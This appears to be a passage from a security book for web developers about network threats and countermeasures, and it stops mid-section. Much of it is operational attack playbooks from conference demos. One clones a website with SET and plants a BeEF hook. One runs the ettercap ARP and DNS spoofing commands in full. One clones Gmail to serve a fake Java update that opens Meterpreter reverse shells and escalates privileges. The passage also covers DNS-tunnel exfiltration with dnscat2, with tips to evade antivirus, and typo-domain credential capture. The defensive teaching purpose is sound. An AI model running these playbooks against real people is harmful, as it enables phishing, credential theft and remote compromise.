<p>The following attack was one of five that I demonstrated at WDCNZ in 2015. The two leading up to this one provide some context and it is probably best to look at them first if you have not already.</p>

<p>You can find the video of how it is played out at <a href="http://youtu.be/ymnqTrnF85M">http://youtu.be/ymnqTrnF85M</a>.</p>

<aside class="information blurb">
    <h3 id="leanpub-auto-synopsis-5">Synopsis</h3>

  <p>The average victim will see a valid URL and the spoof will be undetectable.<br />
Use a website that you know victim is likely to spend some time at. This can make it easier if you are running exploits manually in BeEF.<br />
Can be used to obtain credentials or simply hook with BeEF and run any number of exploits.<br />
SET would be run on the website you want to clone. As SET only gets the index file, you will have to use the likes of <code>wget</code> to get any other missing resources you need to complete the website. Static sites are obviously the easiest. We do not really want to have to create a back-end for the cloned website. You may have to update some of the links to external resources as well in the index.html file that SET creates.<br />
Ideally you will have cleaned out the public web directory that apache hosts from <code>/var/www/</code>. If you do not, I think SET archives everything in there.<br />
You can also leverage ARP and DNS spoofing with Ettercap.</p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
    <h3 id="leanpub-auto-the-play-3">The Play</h3>

  <p>Run <code>setoolkit</code></p>

  <p>Choose:<br />
<code>2) Website Attack Vectors</code></p>

  <p><code>3) Credential Harvester Attack Method</code></p>

  <p><code>2) Site Cloner</code></p>

  <p>Enter the IP address you want to host from. This will probably be the machine you are running these commands from. Although you could host anywhere.</p>

  <p>Enter the URL to clone.</p>

  <p><code>y</code> to start apache.</p>

  <p>Here you will need to either <code>wget</code> any files your missing if you are missing some, or if there are only a small number, just grab them out of your browser developer tools.</p>

  <p>Add the BeEF hook (<code>&lt;script src="http://&lt;BeEF comms server IP address&gt;:3000/hook.js"&gt;&lt;/script&gt;</code>) into the index.html in <code>/var/www/</code> usually at the end of the body, just before the <code>&lt;/body&gt;</code> tag.</p>

  <p>From the directory that you have BeEF installed, run the BeEF ruby script: <code>./beef</code></p>

  <p>Add an A record of the website you ave just cloned and want to spoof into ettercaps dns file: <code>echo "&lt;domainname-you-want-to-clone.com&gt; A &lt;IP address that is hosting the clone&gt;" &gt;&gt; /etc/ettercap/etter.dns</code></p>

  <p>Now run ettercap which is going to both ARP and DNS spoof your victim and the victims gateway with the MItM option, using dns_spoof plugin: <code>ettercap -M arp:remote -P dns_spoof -q -T /&lt;gateway IP address&gt;/ /&lt;victim IP address&gt;/</code>.</p>

  <p>You can now log into the BeEF web UI.</p>

  <p>Now when the victim visits your cloned web site, the URL will look legitimate and they will have no idea that their browser is a BeEF zombie continually asking it is master (the BeEF communications server) what to execute next.</p>

</aside>

<aside class="tip blurb">
    <h3 id="leanpub-auto-beef-can-also-clone">BeEF Can Also Clone</h3>

  <p>BeEF can also be used to clone web sites using its REST API, but it takes more work. The below on using BeEF to do this is only if you really have to.</p>

  <p>In order to clone, once you have BeEF running:<br />
<code>curl -H "Content-Type: application/json: charset=UTF-8" -d '{"url":"http://&lt;domainname-you-want-to-clone.com&gt;", "mount":"/"}' -X POST http://127.0.0.1/api/seng/clone_page?token=&lt;token that BeEF provides when you start it up each time&gt;;</code><br />
The loop-back IP address is just the address that the BeEF REST API is listening on.<br />
When you run this command, you should get back:<br />
<code>{"success":true,"mount":"/"}</code>,<br />
BeEF should also say that it is cloning page at URL:<br />
<code>http://&lt;domainname-you-want-to-clone.com&gt;</code> with other information.  </p>

  <p>As with SET, if any resources other than a single index.html are required,
then they also have to be acquired separately. With BeEF, they need to be copied into:<br />
<code>/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages/</code>.<br />
Routes have to be created in:<br />
<code>/usr/share/beef-xss/extensions/social_engineering/web_cloner/interceptor.rb</code><br />
and also modified to add new <a href="http://sourceforge.net/p/piwat/WAT-Pentoo/ci/6402fce4c6966639927acb72c516edd203c41b77/tree/bin/beef/extensions/social_engineering/web_cloner/web_cloner.rb#l17">config hook</a>,<br />
also added to <code>/usr/share/beef-xss/config.yaml</code>.<br />
Within the same config.yaml file <code>host</code> seems to serve two purposes. The address to access beef and where to fetch hook.js from. If I use an external address, beef only listens on the external interface (can not reach via loopback). So I added a <code>hook</code> config which is the address that the beef communications server is listening on that gets inserted into the cloned web page.</p>

</aside>


<figure id="wdcnz-demo-4" class="image center" style="width: 396px;">
  <img src="images/HandsOnHack.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>The following attack was the fourth of five that I demonstrated at WDCNZ in 2015. The <a href="chap04.html#wdcnz-demo-3">previous demo</a> will provide some additional context and it is probably best to look at it first if you have not already.</p>

<p>You can find the video of how it is played out at <a href="http://youtu.be/WSwqNb_94No">http://youtu.be/WSwqNb_94No</a>.</p>

<aside class="information blurb">
    <h3 id="leanpub-auto-synopsis-6">Synopsis</h3>

  <p>This demo differs from the previous in that the target will be presented with a Java needs to be updated pop-up. When the target plays along and executes what they think is an update, they are in fact starting a reverse shell to the attacker.<br />
The website you choose to clone does not have to be one that the attacker spends much time on. All that is needed is for the attacker to have done their reconnaissance and know which web sites the target frequently visits. Clone one of them. Then wait for the target to fetch it. Then succumb to the attackers bait by clicking the Update or Run this time button.<br />
You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I have not included these steps in this play though, although the video assume they have been included.</p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
    <h3 id="leanpub-auto-the-play-4">The Play</h3>

  <p>Start postgresql:<br />
<code>service postgresql start</code></p>

  <p>Start the Metasploit service:<br />
<code>service metasploit start</code></p>

  <p>Start the Social Engineering Toolkit:<br />
<code>setoolkit</code></p>

  <p>Choose:<br />
<code>1) Social-Engineering Attacks</code></p>

  <p><code>2) Website Attack Vectors</code></p>

  <p><code>6) Multi-Attack Web Method</code></p>

  <p><code>2) Site Cloner</code></p>

  <p>Do not need NAT/Port forwarding.</p>

  <p>Enter the IP address that Metasploit will be listening on. That is the IP address that you are launching the attack from.</p>

  <p>Enter <code>https://gmail.com</code> as the URL to clone.</p>

  <p>Turn on <code>1. Java Applet Attack Method</code> &amp; <code>2. Metasploit Browser Exploit Method</code>.<br />
Proceed with the attack.<br />
The website is now cloned.  </p>

  <p>Select the vulnerabilities to exploit: <code>2) Meterpreter Multi-Memory Injection</code>.  </p>

  <p>Select the payloads to deliver. Select them all.<br />
Confirm Port 443 to help disguise the reverse connection as legit.<br />
The payloads are now encrypted and the reverse shells configured.  </p>

  <p>Take the easy option of <code>(2) Java Applet</code></p>

  <p>Select <code>Metasploit Browser Autopwn</code> for the Java Applet browser exploit.<br />
The cloned site is hosted -&gt; msfconsole is started.</p>

  <p>Target fetches our spoofed gmail.<br />
Oh we have a Java update.<br />
Now we know we are always supposed to keep our systems patched right?<br />
Better update.</p>

  <p>Anti-virus (AV) says we are all safe. Must be all good.<br />
A PowerShell exploit fails.  </p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p>Here come the shells.<br />
Interact with the first one:
<code>sessions -i 1</code></p>

  <p>Attempt to elevate privileges:<br />
<code>getsystem</code><br />
Does not work on this shell.</p>

  <p>Let us list the available meterpreter extensions to make sure we have <code>priv</code>.<br />
<code>use -l</code><br />
and priv is in the list.<br />
Now that we know we have <a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/">priv</a>, we can:</p>

  <p><code>run bypassuac</code><br />
Now that is successful, but AV detects bad signatures on some of the root-kits. On this shell I only got the privileges of the target running the browser exploit.</p>

</aside>

<h4 id="network-identify-risks-data-exfiltration-infiltration">Data Exfiltration, Infiltration</h4>

<figure class="image center" style="width: 395px;">
  <img src="images/ThreatTags----average-common-difficult-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<h5 id="leanpub-auto-ingress-and-egress-techniques">Ingress and Egress Techniques</h5>

<p>In many/most cases a target will have direct access, or almost direct via a proxy from their corporate LAN to the internet. This makes egress of any kind trivial. The following are some commonly used techniques:</p>

<h5 id="network-identify-risks-data-exfiltration-infiltration-dropbox">Dropbox</h5>

<p>No anti-virus is run by Dropbox on the files that Dropbox syncs. This means that Dropbox is a risk in a corporate environment, or any work environment where workers can access their files from multiple networks. Dropbox via an account or even just their HTTP links can be a useful means for exfiltration of data. Dropbox APIs and their SDKs along with community provided SDKs can assist the attacker greatly in exfiltrating their targets data over HTTP(S), and establishing command and control (C2) communications. <a href="https://github.com/0x09AL/DropboxC2C">DropboxC2C</a> is one project that does this. All bar the most secure environments allow HTTP(S) egress.</p>

<h5 id="leanpub-auto-physical">Physical</h5>

<p>If there is no Internet access from the targets environment, physical media can be utilised. We discussed this in the Infectious Media subsection of Identify Risks of the People chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers/">Fascicle 0</a>.</p>

<h5 id="leanpub-auto-mobile-phone-data">Mobile Phone Data</h5>

<p>In most cases, everyone carries at least one mobile phone capable of connecting to the Internet via their cellular provider, obviously this bypasses any rules that the target organisation has in place. Data can be easily exfiltrated directly from mobile devices, or via their access point feature if enabled. Bluetooth offers a similar functionality.</p>

<p>An attacker has options such as using staff members phones, or if they can get a phone to within wireless access coverage of a computer with a wireless interface that has data to be exfiltrated, then they just need to make the access point switch. This could be done during a lunch break.</p>

<h5 id="leanpub-auto-dns-ssh">DNS, SSH</h5>

<p>In the case of very security conscious environments, where few users have any access to the Internet, and those that do have, the access is indirect via a very restrictive proxy.</p>

<p>If a user has any Internet access from a machine on the internal network, then you can probably leverage DNS.</p>

<p>If a <code>ping</code> command is sent from the internal machine, this may produce a <code>timed out</code> result, but before the <code>ping</code> can be resolved, a DNS query must be satisfied.</p>

<figure class="code">
<div class="highlight"><pre><code></code>ping google.co.nz
PING google.co.nz <code class="o">(</code><code class="m">172</code>.217.25.163<code class="o">)</code> <code class="m">56</code><code class="o">(</code><code class="m">84</code><code class="o">)</code> bytes of data.

<code class="c1"># Here, the command will print:</code>

Request timed out.
Request timed out.
Request timed out.
etc.

<code class="c1"># Or just hang and then print something similar to:</code>

--- google.co.nz ping statistics ---
<code class="m">662</code> packets transmitted, <code class="m">0</code> received, <code class="m">100</code>% packet loss, <code class="nb">time</code> 662342ms
</pre></div>

</figure>

<p>So although the ICMP protocol requests may be blocked or dropped,
the DNS query will likely be forwarded from the local system resolver / DNS client / <a href="http://www.zytrax.com/books/dns/apa/resolver.html">stub resolver</a> to the organisations Internet facing name server, then forwarded to an ISPs or alternative name servers on the Internet. This same DNS lookup will occur when many other protocols that may be blocked are initiated.</p>

<p><code>dig +trace</code> mirrors the way a typical DNS resolution works, but provides visibility into the actual process and steps taken.</p>

<p>By using <code>dig +trace</code> we can get feedback on how the given fully qualified domain name (FQDM) is resolved. <code>dig +trace</code> works by pretending it is a name server, iteratively querying recursive and authoritative name servers. The steps taken in a DNS query which is mirrored by <code>dig +trace</code> look like the following:</p>

<ol class="numeric">
  <li>DNS query is sent from a client application to the system resolver / DNS client / stub resolver. The stub resolver is not capable of a lot more than searching a few static files locally such as <code>/etc/hosts</code>, maintaining a cache, and forwarding requests to a recursive resolver, which is usually provided by your ISP or one of the other DNS providers you may choose, such as Level 3, Google, DynDNS, etc. The stub resolver can not follow referrals. If the stub resolvers cache or hosts file does not contain the IP address of the queried FQDM that is within the time-to-live (TTL) if cached, the stub resolver will query the recursive resolver. The query that the stub resolver sends to the recursive DNS resolver has a special flag called Recursion Desired (<code>RD</code>) in the DNS request header (see <a href="https://www.ietf.org/rfc/rfc1035.txt">RFC 1035</a> for details) which instructs the resolver to complete the recursion and provide a response of either an IP address (with the Recursion Available (<code>RA</code>) flag set), or an error (with the Recursion Available (<code>RA</code>) flag not set)</li>
  <li>The recursive resolver will check to see if it has a cached DNS record from the authoritative nameserver with a valid TTL. If the recursive server does not have the DNS record cached, it begins the recursive process of going through the authoritative DNS hierarchy. The recursive resolver queries one of the root name servers (denoted by the . at the end of the domain name) for the requested DNS record to find out who is the authoritative name server for the TLD (<code>.nz</code> in our case). This query does not have the <code>RD</code> flag set, which means it is an iterative query, meaning that the response must be one of either:
    <ol class="numeric">
      <li>The location of an authoritative name server</li>
      <li>An IP address as seen in step 6 once the recursion resolves</li>
      <li>An error</li>
    </ol>

    <p>There are 13 root server clusters from a-m, as you can see in the <code>dig +trace</code> output below, with servers from <a href="http://www.root-servers.org/">over 380 locations</a></p>
  </li>
  <li>The root servers know the locations of all of the Top-Level Domains (TLDs) such as <code>.nz</code>, <code>.io</code>, <code>.blog</code>, <code>.com</code>, but they do not have the IP information for the FQDN, such as <code>google.co.nz</code>. The root server does know that the TLD <code>.nz</code> may know, so it returns a list of all the four to thirteen clustered <code>.nz</code> <a href="https://en.wikipedia.org/wiki/Generic_top-level_domain">generic TLD</a> (gTLD) server <code>ns</code> (name server) IP addresses. This is the root name servers way of telling the recursive resolver to query one of the <code>.nz</code> gTLD authoritative servers</li>
  <li>The recursive resolver queries one of the <code>.nz</code> gTLD authoritative servers (<code>ns&lt;n&gt;.dns.net.nz.</code> in our case) for <code>google.co.nz.</code>
</li>
  <li>The <code>.nz</code> TLD authoritative server refers the recursive server to the authoritative servers for <code>google.co.nz.</code> (<code>ns&lt;n&gt;.google.com.</code>)</li>
  <li>The recursive resolver queries the authoritative servers for <code>google.co.nz,</code> and receives 172.217.25.163 as the answer</li>
  <li>At this point the recursive resolver has finished its recursive process, caches the answer for the TTL duration specified on the DNS record, and returns it to the stub resolver having the Recursion Available (RA) flag set, indicating that the answer was indeed fully resolved</li>
</ol>


<figure class="image center" style="width: 396px;">
  <img src="images/DNSResolution.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<figure class="code">
  <figcaption>Step 1</figcaption>

<div class="highlight"><pre><code></code>dig +trace google.co.nz
</pre></div>

</figure>

<figure class="code">
  <figcaption>Step 2</figcaption>

<div class="highlight"><pre><code></code><code class="p">;</code> &lt;&lt;&gt;&gt; DiG <code class="m">9</code>.10.3-P4-Ubuntu &lt;&lt;&gt;&gt; +trace google.co.nz
<code class="p">;;</code> global options: +cmd
.        <code class="m">448244</code>   IN NS b.root-servers.net.
.        <code class="m">448244</code>   IN NS h.root-servers.net.
.        <code class="m">448244</code>   IN NS l.root-servers.net.
.        <code class="m">448244</code>   IN NS a.root-servers.net.
.        <code class="m">448244</code>   IN NS j.root-servers.net.
.        <code class="m">448244</code>   IN NS c.root-servers.net.
.        <code class="m">448244</code>   IN NS m.root-servers.net.
.        <code class="m">448244</code>   IN NS e.root-servers.net.
.        <code class="m">448244</code>   IN NS g.root-servers.net.
.        <code class="m">448244</code>   IN NS i.root-servers.net.
.        <code class="m">448244</code>   IN NS d.root-servers.net.
.        <code class="m">448244</code>   IN NS k.root-servers.net.
.        <code class="m">448244</code>   IN NS f.root-servers.net.
<code class="c1"># The RRSIG holds the DNSSEC signature.</code>
<code class="c1"># +trace includes +dnssec which emulates the default queries from a nameserver</code>
.        <code class="m">514009</code>   IN RRSIG NS <code class="m">8</code> <code class="m">0</code> <code class="m">518400</code> <code class="m">20170728170000</code> <code class="m">20170715160000</code> <code class="m">15768</code> . Egf30NpCVAwTA4<code class="se">\</code>
q8B8Ye7lOcFraVLo3Vh8vlhlZFGIFHsHNUFDyK2NxM RJr4Z+NzZat/JUmNQscob5Mg9N2ujVPZ9ZgQ1TJ8Uu6+azR6A1<code class="se">\</code>
kr95Vu S8hepkdr42lZdrv2QV9qR0DeXWglo0NemF7D7ZMlM/fVAoiYvoDRugc6 v9SWjedD3XtOoOjPAYjNc7M8PQ6VZ<code class="se">\</code>
5qIil2arnR/ltQJm2bQbIXAw4DG a3NQJw06G5E7FjMqn+/tTfzm/Z95UIsAUojGV4l1VIGulm9IZtYB5H5C hCoWt4bh<code class="se">\</code>
aCKm2U2BJBfmvvB7rN1fsd1JKnCayzKvHRL0WWvSsvjyN6Hv F/PCaw<code class="o">==</code>
<code class="p">;;</code> Received <code class="m">1097</code> bytes from <code class="m">127</code>.0.1.1#53<code class="o">(</code><code class="m">127</code>.0.1.1<code class="o">)</code> in <code class="m">91</code> ms
</pre></div>

</figure>

<figure class="code">
  <figcaption>Step 3</figcaption>

<div class="highlight"><pre><code></code>nz.        <code class="m">172800</code>   IN NS ns1.dns.net.nz.
nz.         <code class="m">172800</code>   IN NS ns2.dns.net.nz.
nz.         <code class="m">172800</code>   IN NS ns3.dns.net.nz.
nz.         <code class="m">172800</code>   IN NS ns4.dns.net.nz.
nz.         <code class="m">172800</code>   IN NS ns5.dns.net.nz.
nz.         <code class="m">172800</code>   IN NS ns6.dns.net.nz.
nz.         <code class="m">172800</code>   IN NS ns7.dns.net.nz.
nz.         <code class="m">86400</code> IN DS <code class="m">46034</code> <code class="m">8</code> <code class="m">1</code> 316AB5861714BD58905C68B988B2B7C87CB78C4A
nz.         <code class="m">86400</code> IN DS <code class="m">46034</code> <code class="m">8</code> <code class="m">2</code> 02C64093D011629EF821494C5D918B8151B1B81FD008E175954F8871 <code class="m">19</code><code class="se">\</code>
FEB5B1
nz.         <code class="m">86400</code> IN RRSIG DS <code class="m">8</code> <code class="m">1</code> <code class="m">86400</code> <code class="m">20170728170000</code> <code class="m">20170715160000</code> <code class="m">15768</code> . RAn3+mAjCAk5+/H<code class="se">\</code>
3J4YMjISnitGJHMaR49n+YPn2q447VXViBcUxm0hO ZK+3ut5ywtiT4v1AMZXN9TDQ1EFe2T/VPWbdpOEs71pOS9/wdAZ<code class="se">\</code>
OlySR 9tfdwdnnPb1+InA9H1u384vCZDIoy4vsz9jRnBk3+hIocIcrmMhMdSJU jNBXfaW3uZ5vboQqAzr1WhrbyHebRF<code class="se">\</code>
Mdiq+NliSQU/DunOOD2j/9fJu/ VT4dWFP3mkb3wYPm+MLwDO7hDatJih5dmKzREzjVbxiGjaFQyTUTz7CZ EJsP8O21e<code class="se">\</code>
8TZLk5mWenBrWhkcce+xas8PGXh754Ltg3/1zuUmuuJ93Sf <code class="nv">PwCBwQ</code><code class="o">==</code>
<code class="p">;;</code> Received <code class="m">854</code> bytes from <code class="m">192</code>.58.128.30#53<code class="o">(</code>j.root-servers.net<code class="o">)</code> in <code class="m">649</code> ms
</pre></div>

</figure>

<figure class="code">
  <figcaption>Step 4</figcaption>

<div class="highlight"><pre><code></code>google.co.nz.    <code class="m">86400</code> IN NS ns3.google.com.
google.co.nz.     <code class="m">86400</code> IN NS ns1.google.com.
google.co.nz.     <code class="m">86400</code> IN NS ns2.google.com.
google.co.nz.     <code class="m">86400</code> IN NS ns4.google.com.
e1e8sage14qa404t0i37cbi1vb5jlkpq.co.nz.   <code class="m">3600</code> IN  NSEC3 <code class="m">1</code> <code class="m">1</code> <code class="m">5</code> 5AFBAC60E6291D43 E3D0PASFAJFBN<code class="se">\</code>
713OGDH06QD9PUOUFOL NS SOA RRSIG DNSKEY NSEC3PARAM
e1e8sage14qa404t0i37cbi1vb5jlkpq.co.nz.   <code class="m">3600</code> IN  RRSIG NSEC3 <code class="m">8</code> <code class="m">3</code> <code class="m">3600</code> <code class="m">20170724002713</code> <code class="m">201707</code><code class="se">\</code>
<code class="m">15224319</code> <code class="m">17815</code> co.nz. PSQpSuLombCp+gzGad6vfjQwQXdtEho1asIu7LR8ROpISAiVYuNaDCzn syxVWPDt5JXuV4<code class="se">\</code>
Ro9QwqtIIyKGp+SR0E6vfB0ZBmKMWTGE8JDs4wFJD8 4Pa3EJE9HD6D5OzYLGWp74j5rKCmhX1tHsAZH6kxMepxmXe7Yx<code class="se">\</code>
r1ejSU <code class="nv">pNA</code><code class="o">=</code>
o5jradpam3chashu782ej6r90spf0slk.co.nz.   <code class="m">3600</code> IN  NSEC3 <code class="m">1</code> <code class="m">1</code> <code class="m">5</code> 5AFBAC60E6291D43 OBU0IO78N1LTE<code class="se">\</code>
RC33TPID5EMGNQOA7T7 NS DS RRSIG
o5jradpam3chashu782ej6r90spf0slk.co.nz.   <code class="m">3600</code> IN  RRSIG NSEC3 <code class="m">8</code> <code class="m">3</code> <code class="m">3600</code> <code class="m">20170721184152</code> <code class="m">201707</code><code class="se">\</code>
<code class="m">14214319</code> <code class="m">17815</code> co.nz. F7I2sw56hULCCYpZuO9i5020cXoq+31tTaoU9c/uNr6amFdO112oximh mDr3Ad/w/E7Le4<code class="se">\</code>
WVmGAHOgeLsFH8OI19MciVqMmg232z04jVLdIuFIBH U+SsRXiwzoRb5fFh/mlUthjiqjk+0U/LPbM3jZNqRduSbDRFaE<code class="se">\</code>
JOsGz4 <code class="nv">ZlQ</code><code class="o">=</code>
<code class="p">;;</code> Received <code class="m">628</code> bytes from <code class="m">185</code>.159.197.130#53<code class="o">(</code>ns5.dns.net.nz<code class="o">)</code> in <code class="m">319</code> ms
</pre></div>

</figure>

<figure class="code">
  <figcaption>Step 5</figcaption>

<div class="highlight"><pre><code></code>google.co.nz.    <code class="m">300</code>   IN A  <code class="m">172</code>.217.25.163
<code class="p">;;</code> Received <code class="m">46</code> bytes from <code class="m">216</code>.239.32.10#53<code class="o">(</code>ns1.google.com<code class="o">)</code> in <code class="m">307</code> ms
</pre></div>

</figure>

<p>In following the above process through, you can see that although egress may be very restricted, DNS will just about always make it to the authoritative name server(s).</p>

<p>The most flexible and useful type of DNS record for the attacker is the <code>TXT</code> record. We discuss the DNS <code>TXT</code> record briefly in the <a href="chap04.html#network-countermeasures-spoofing-email-address">EMail Address Spoofing Countermeasures</a> subsection. The <code>TXT</code> record is very flexible, useful for transferring arbitrary data, including code, commands (see section 3.3.14. <code>TXT RDATA</code> format of the <a href="https://www.ietf.org/rfc/rfc1035.txt">specification</a>), which can also be modified at any point along its travels. There is no specific limit on the number of text strings in a  <code>TXT RDATA</code> field, but the TXT-DATA can not exceed 65535 bytes (general restriction on all records) in total. Each text string can not exceed 255 characters in length including the length byte octet of each. This provides plenty of flexibility for the attacker.</p>

<p>The evolution of data exfiltration and infiltration started with <a href="https://room362.com/post/2009/2009310ozymandns-tunneling-ssh-over-dns-html/">OzymanDNS</a> from Dan Kaminsky in 2004. Shortly after that Tadeusz Pietraszek created <a href="http://tadek.pietraszek.org/projects/DNScat/">DNScat</a>, providing bi-directional communications through DNS servers. DNScat took the netcat idea and applied it to DNS, allowing penetration testers and attackers alike to pass through firewalls unhindered. DNScat is written in Java, requiring the JVM to be installed. Ron Bowes created the successor called <a href="https://github.com/iagox86/dnscat2">dnscat2</a>, you can check the history of dnscat2 on the github <a href="https://github.com/iagox86/dnscat2#history">history section</a>.</p>

<p>In order to carry out a successful Exfil, the attacker will need:</p>

<ol class="numeric">
  <li>A domain name registered for this attack</li>
  <li>A payload they can drop on one to many hosts inside their target network.
The <a href="https://github.com/iagox86/dnscat2#client">dnscat2 client</a> is written in C, modifications can and should be made to the source to help avoid detection.
Dnscat2 also provides the ability to tunnel SSH from the dnscat2 server (C2) to the dnscat2 client, and even to other machines on the same network. All details are provided on the dnscat2 <a href="https://github.com/iagox86/dnscat2#tunnels">github</a>, and even more details are provided on <a href="https://blog.skullsecurity.org/2015/dnscat2-0-05-with-tunnels">Rons blog</a>. Once the attacker has modified the client source, they will most likely run <a href="https://www.virustotal.com/">VirusTotal</a> or a similar service over it, to attempt to verify the likelihood of the payload being detected. We have covered quite a few techniques for increasing the chances of getting the payload onto the target systems in the <a href="chap03.html#vps-identify-risks-powershell">PowerShell</a> subsections of the VPS chapter, and the Infectious Media subsections of the People chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers/">Fascicle 0</a>.</li>
  <li>A command and control (C2) server set-up as the domains authoritative name server that is capable of communicating with the executing payload(s) on the hosts inside the targets network. <a href="https://github.com/izhan">izhan</a> created a <a href="https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md">howto document</a> covering the authoritative name server set-up. dnscat2 was created for this very reason.</li>
</ol>

<p>All the documentation required to set-up the C2 server and client is provided by dnscat2.</p>

<h4 id="network-identify-risks-doppelganger-domains">Doppelganger Domains</h4>

<p>Often domain consumers (people: sending emails, browsing websites, SSHing, etc) miss type the domain. The most common errors are leaving . out between the domain and sub domain. Even using incorrect country suffixes. Attackers can take advantage of this by purchasing the miss typed domains. This allows them to intercept requests with: credentials, email and other sensitive information that comes their way by unsuspecting domain consumers.</p>

<h5 id="network-identify-risks-doppelganger-domains-websites">Web-sites</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-common-average-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Useful for social engineering users to a spoofed web-site. The attacker may not be able to spoof the DNS entries, although this is the next best thing. For example <code>accountsgoogle.co.nz</code> could look reasonably legitimate for a New Zealand user intending to sign into their legitimate google account at <code>accounts.google.com</code>. In fact at the time of writing, this domain is available. Using the methods described in the Website section to clone and host a site and convince someone to browse to it with a doppelganger domain like this is reasonably easy.</p>


<figure class="image center" style="width: 394px;">
  <img src="images/accountsgoogle-available0.jpg" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>



<figure class="image center" style="width: 394px;">
  <img src="images/accountsgoogle-available1.jpg" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<h5 id="network-identify-risks-doppelganger-domains-smtp">SMTP</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-common-difficult-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<ol class="numeric">
  <li>By purchasing the doppelganger (miss typed) domains</li>
  <li>configuring the mail exchanger (MX) record</li>
  <li>setting up an SMTP server to catch all
    <ol class="numeric">
      <li>record</li>
      <li>modify the to address to the legitimate address</li>
      <li>modify the from address to the doppelganger domain that the attacker owns (thus also intercepting the mail replies)</li>
      <li>forward (essentially MItM).</li>
    </ol>
  </li>
</ol>

<p>The attacker gleans a lot of potentially sensitive information.</p>

<h5 id="network-identify-risks-doppelganger-domains-ssh">SSH</h5>

<figure class="image center" style="width: 395px;">
  <img src="images/ThreatTags----average-common-difficult-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Less traffic, but if/when compromised, potentially much larger gains. You do not get better than shell access. Especially if they have not disallowed root, as discussed in the VPS chapter under <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-sshd_config">Hardening SSH</a>.</p>

<p>Setup the DNS A record value to be the IP address of the attackers SSH server and the left most part of the name to be *, so that all possible substitutions that do not exist (not just that do not have any matching records) will receive the attackers SSH server IP address. The DNS wild-card rules are complicated.</p>

<p>An SSH server needs to be set-up to record the user-names and passwords. The OpenSSH code needs to be modified in order to do this.</p>

<h4 id="network-identify-risks-wrongfully-trusting-the-loading-of-untrusted-web-resources">Wrongfully Trusting the Loading of Untrusted Web Resources</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-verywidespread-easy-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>By default, the browser allows all resources from all locations to be loaded. What would happen if one of those servers was compromised or an attacker was tampering with the payload potentially changing what was expected for something malicious to be executed once loaded? This is a very common technique for attackers wishing to get their malicious scripts into your browser.</p>

<h4 id="network-identify-risks-tls-downgrade">TLS Downgrade</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-common-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>When ever a user browses to a HTTPS website, there is the potential for an attacker to intercept the request before the TLS handshake is made, and if the web server accepts an unencrypted request, redirect the user to the same website but without the TLS.</p>

<p>This is a danger for all websites that do not enforce TLS for every page, or better, at the domain level. For example many websites are run over plain HTTP until the user wants to log-in. At which point the browser issues a request to an HTTPS resource that is listed on an unencrypted page. These requests can easily be intercepted and the attacker change the request to HTTP so that the TLS handshake is never made.</p>

<p><a href="https://httpswatch.nz">https://httpswatch.nz</a> is an excellent resource for some of the prominent websites in New Zealand, informing them of the issues in regards to HTTPS health.</p>

<h3 id="network-countermeasures">3. SSM Countermeasures</h3>

<p>Revisit the Countermeasures subsection of the first chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>.</p>

<ul>
  <li><a href="https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_006">MS Network Threats and Countermeasures</a></li>
</ul>

<h4 id="network-countermeasures-fortress-mentality">Fortress Mentality</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>This section takes the concepts from the section with the same name from the Physical chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers/">Fascicle 0</a>.</p>

<p>Once we get over the fact that we are no longer safe behind our firewalls, we can start to progress in terms of the realisation that our inner components: services, clients, communications will be attacked, and we need to harden them.</p>

<p>Our largest shortcoming continues to be our people falling victim to common social engineering attacks. Ive spoken about this in <a href="https://leanpub.com/holistic-infosec-for-web-developers/">Fascicle 0</a>, so please refer to that if you have not already read it.</p>

<p>The organisation needs to decide and enforce their own policies, just as you do for your own personal devices and network(s).</p>

<p>The organisation could decide to not allow any work devices to be taken from the premises.</p>

<p>Another option is to actually help their workers be more secure with everything in their lives that have the potential to impact the business. What effects the workers impacts the business.</p>

<p>Have a separate wireless network for your visitors and workers to access the internet.</p>

<p>In terms of technology, most of the VPS chapter was focussed on removing services that are not needed and hardening those that are, with the intention that your corporate network is almost as good as being directly on the internet without a perimeter anyway.</p>

<p>Once you have made sure your listening services are patched and you are only using security conscious services, your communications between services are encrypted, then technology wise, you are doing well.</p>

<p>For file and data sharing from machine to machine no matter where they are, and also from software client to service you can use the likes of Tresorits offerings:</p>

<ul>
  <li>
<a href="https://tresorit.com/">Tresorit</a> for encrypted file storage for as many people as need it, with about as much configurability as you can dream of</li>
  <li>
<a href="https://tresorit.com/zerokit">Tresorit ZeroKit SDK</a> User authentication and end-to-end encryption for Android, iOS and JavaScript applications</li>
</ul>

<h4 id="network-countermeasures-lack-of-segmentation">Lack of Segmentation</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
